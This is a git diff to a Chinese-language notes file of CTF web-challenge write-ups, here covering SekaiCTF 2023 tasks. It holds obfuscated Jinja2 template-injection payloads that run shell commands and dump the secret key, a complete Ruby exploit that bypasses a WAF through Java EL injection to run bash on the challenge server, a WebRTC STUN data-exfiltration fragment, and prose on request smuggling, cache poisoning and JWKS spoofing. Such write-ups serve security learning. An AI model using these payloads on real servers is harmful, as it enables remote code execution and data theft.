@@ -115,6 +115,48 @@ for i in range(300,1000):
      - `{{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27cmd%27)|attr(%27read%27)()}}`
     - `{{%22%22|attr(%27\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%27)|attr(%27\x5f\x5f\x62\x61\x73\x65\x5f\x5f%27)|attr(%27\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(411)(%27cmd%27,shell=True,stdout=-1)|attr(%27communicate%27)()}}`
     - 获取SECRET KEY：`{{self|attr("\x5f\x5fdict\x5f\x5f")}}`
+- [Frog-WAF](https://fireshellsecurity.team/sekaictf-frog-waf-and-chunky/)
+    - java ssti模板注入（[EL - Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language)）。此题的难点在于waf，限制了所有数字和一些特殊符号与java的类名
+    - 其他payload：
+        - https://github.com/AlbertoFDR/CTF/tree/main/2023/ProjectSekai/web/Frog-WAF
+        - https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba
+        - https://github.com/SuperStormer/writeups/tree/master/sekaictf_2023/web/frog-waf
+        - https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00
+        ```rb
+        require 'http'
+        def gen_s(s)
+            a = <<E.strip!
+            [].toString().getClass().getMethods()[#{Array.new(22, []).inspect}.size()].invoke([].toString(), [].size()).getClass().getMethods()[#{Array.new(5, []).inspect}.size()].invoke([].toString().getClass().getMethods()[#{Array.new(22, []).inspect}.size()].invoke([].toString(), [].size()), %s.size())
+        E
+            r = []
+            s.chars.each do |c|
+                r << a % Array.new(c.ord, []).inspect
+            end
+            sr = ""
+            r.each do
+                if sr.length.zero?
+                    sr << _1
+                    next
+                else
+                    sr << (".concat(%s)" % _1)
+                end
+            end
+            sr
+        end
+        cn = gen_s("java.lang.Runtime")
+        # https://ares-x.com/tools/runtime-exec/
+        cmd = gen_s("bash -c {echo,Y2F0IC9mbGFnLSoudHh0}|{base64,-d}|{bash,-i}")
+        bcn = gen_s("java.util.Base64")
+        exp = <<E.strip!
+        [].getClass().getClass().getMethods()[#{Array.new(2, []).inspect}.size()].invoke(null, #{cn}).getMethods()[#{Array.new(6, []).inspect}.size()].invoke(null).exec(#{cmd}).getInputStream()
+        E
+        r_exp = <<E.strip!
+        ${[].getClass().getClass().getMethods()[#{Array.new(2, []).inspect}.size()].invoke(null, #{bcn}).getMethods()[#{Array.new(6, []).inspect}.size()].invoke(null).getClass().getMethods()[#{Array.new(4, []).inspect}.size()].invoke([].getClass().getClass().getMethods()[#{Array.new(2, []).inspect}.size()].invoke(null, #{bcn}).getMethods()[#{Array.new(6, []).inspect}.size()].invoke(null), #{exp}.readAllBytes())}
+        E
+        url = "http://frog-waf.chals.sekai.team/addContact"
+        r = HTTP.post(url, json: {"firstName": "test", "lastName": "test", "description": "test", "country": r_exp})
+        puts r
+        ```
 - [更多模板注入payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
 1.  [浏览器设置编码](https://blog.csdn.net/jnx1142410525/article/details/55271037)。如果浏览器的编码不对就会出现乱码。
@@ -2859,3 +2901,9 @@ pc = new RTCPeerConnection({"iceServers":[{"urls":["stun:"+ "data_want_to_exfilt
 ```
 wp里还有将要泄露的内容转换为符合域名规范的16进制的进阶payload。注意转为16进制内容可能会很长，而域名的每个label最长63个字符，超过后请求失败。所以需要手动发送多次payload，每次更改截取的索引。
 - 如果是借助get传payload，尽量将paylaod base64encdoe。不然浏览器会自动编码特殊字符
+297. [Chunky](https://fireshellsecurity.team/sekaictf-frog-waf-and-chunky/#challenge-chunky-16-solves)
+- 请求走私（[Request Smugling](https://portswigger.net/web-security/request-smuggling)）。也可以参考 https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn 。简单来说，就是一个服务由多个服务器组成，前端和后端。这些服务器对Content-Length和Transfer-Encoding的处理不一致，导致前端认为是一个request，传给后端就变成了两个。能利用这个走私进去的request进行特殊的攻击
+- [Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)。有请求走私的情况下可以考虑这个攻击（当然前提是这个服务有cache server）。Cache Poisoning指的是，以某种方法让请求A时服务器返回的内容为有害payload，然后让cache server记住这个内容，以后任何用户访问A时拿到的都是payload。结合请求走私，我们在请求A的后面走私一个请求B，后端服务器会返回A和B的response，但是前端服务器认为自己只请求了A，只读取了A的response。接下来请求C时，B就被返回了，造成请求C获取到的却是B。如果能让server cache这个结果，以后任何人访问C得到的都是B了
+- [JWKS Spoofing](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jwks-spoofing)：有些网站验证JWT token时会请求某个url A获取public key，然后验签。利用cache poisoning，将url A投毒为攻击者自己的公钥即可伪造jwt
+298. [The Bidding](https://lkmidas.github.io/posts/20230828-sekaictf2023-writeups)
+- Anchor Framework solana（rust） blockchain题目。这题在比赛时被归为pwn，但是我习惯把blockchain相关的放在web
